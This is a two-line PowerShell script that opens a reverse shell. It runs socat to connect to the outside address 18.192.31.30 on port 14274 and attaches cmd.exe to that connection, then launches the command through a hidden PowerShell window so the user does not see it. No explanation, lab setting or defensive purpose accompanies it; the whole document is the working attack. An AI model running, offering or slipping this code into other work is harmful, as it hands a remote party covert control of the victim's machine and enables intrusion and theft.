$command = ".\socat.exe tcp-connect:18.192.31.30:14274 exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
